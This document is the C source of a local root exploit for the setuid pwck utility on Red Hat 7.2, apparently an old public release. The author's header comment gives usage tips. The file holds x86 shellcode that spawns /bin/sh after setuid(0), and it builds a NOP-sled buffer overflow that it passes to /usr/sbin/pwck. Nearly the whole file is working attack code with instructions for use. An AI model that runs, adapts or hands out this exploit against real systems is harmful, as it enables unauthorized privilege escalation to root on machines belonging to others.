/*pwck Exploit for Redhat. Tested on RedHat 7.2 2.4.7-10.Yea I know 
some of the code is jacked ,but it works so back off! Use -2000 -1000 for offset. /usr/sbin/pwck must be -rwsr-sr-x to drop root. DUH. To test set pwck +s if it's not suid already. RET_POSITION will probably vary. Do /usr/sbin/pwck `perl -e 'print"A"xnumber'` until seg fault. werd!

Shoutz to starr, bickley, diginix, #713, N0de and cvx.
klep[klep@darkstar.bast.net]
*/
#include<stdio.h>
#include<stdlib.h>

#define ALIGN                             0
#define OFFSET                            0
#define RET_POSITION                   2169
#define RANGE                            20
#define NOP                            0x90

char shellcode[]=
	"\x31\xc0"                     
	"\x31\xdb"                     
	"\xb0\x17"                      
	"\xcd\x80"                      
	"\xeb\x1f"                      
	"\x5e"                          
	"\x89\x76\x08"                  
	"\x31\xc0"                     
	"\x88\x46\x07"                  
	"\x89\x46\x0c"                  
	"\xb0\x0b"                      
	"\x89\xf3"                     
	"\x8d\x4e\x08"                  
	"\x8d\x56\x0c"                  
	"\xcd\x80"                      
	"\x31\xdb"                      
	"\x89\xd8"                      
	"\x40"                          
	"\xcd\x80"                     
	"\xe8\xdc\xff\xff\xff"          
	"/bin/sh";                      /* .string \"/bin/sh\"   */

unsigned long get_sp(void)
{
	__asm__("movl %esp,%eax");
}

int main(int argc,char **argv)
{
	char buff[RET_POSITION+RANGE+ALIGN+1],*ptr;
	long addr;
	unsigned long sp;
	int offset=OFFSET,bsize=RET_POSITION+RANGE+ALIGN+1;
	int i;

	if(argc>1)
		offset=atoi(argv[1]);

	sp=get_sp();
	addr=sp-offset;

	for(i=0;i<bsize;i+=4)
	{
		buff[i+ALIGN]=(addr&0x000000ff);
		buff[i+ALIGN+1]=(addr&0x0000ff00)>>8;
		buff[i+ALIGN+2]=(addr&0x00ff0000)>>16;
		buff[i+ALIGN+3]=(addr&0xff000000)>>24;
	}

	for(i=0;i<bsize-RANGE*2-strlen(shellcode)-1;i++)
		buff[i]=NOP;

	ptr=buff+bsize-RANGE*2-strlen(shellcode)-1;
	for(i=0;i<strlen(shellcode);i++)
		*(ptr++)=shellcode[i];

	buff[bsize-1]='\0';

	printf("Jump to 0x%08x\n",addr);

	execl("/usr/sbin/pwck","pwck",buff,0);
}

